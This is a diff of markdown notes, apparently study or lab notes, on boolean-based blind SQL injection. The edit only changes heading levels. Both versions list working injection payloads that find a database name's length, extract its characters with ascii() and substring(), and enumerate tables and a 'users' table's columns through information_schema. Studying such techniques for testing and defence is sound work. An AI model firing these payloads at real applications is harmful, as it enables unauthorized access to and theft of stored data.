@@ -76,31 +76,31 @@
 
 ## 3. Emnumerate Data
 
-#### 1. Finding Length of Database
+### 1. Finding Length of Database
 
 - Use `<` and `=` operater and find the length of Database name
 - `AND (LENGTH(database())) < 10` 
 - `AND (LENGTH(database())) = 8` 
 
-#### 2. Finding Database name using `ascii()` and `substring()` Function
+### 2. Finding Database name using `ascii()` and `substring()` Function
 
 
 - `AND (ascii(substring(database(),1,1))) < 100`
 
-#### 3. Finding Table name 
+### 3. Finding Table name 
 
-- Step by step payload creation
+#### Step by step payload creation
 
-	- `AND (ascii(substring()))`
+- `AND (ascii(substring()))`
 
-	- `(select table_name from information_schema.tables where table_schema= database() limit 0,1);
+- `(select table_name from information_schema.tables where table_schema= database() limit 0,1);
 `
 
-- Final payload (I already know user tables is fourth table and then use `limit 3,1`)
+#### Final payload (I already know user tables is fourth table and then use `limit 3,1`)
 
 - `AND (ascii(substring((select table_name from information_schema.tables where table_schema= database() limit 3,1), 1,1 ))) < 100`
 
-#### 4. Finding Column name
+### 4. Finding Column name
 
 
 `AND (ascii(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema= database() limit 1,1), 1,1 ))) < 100`
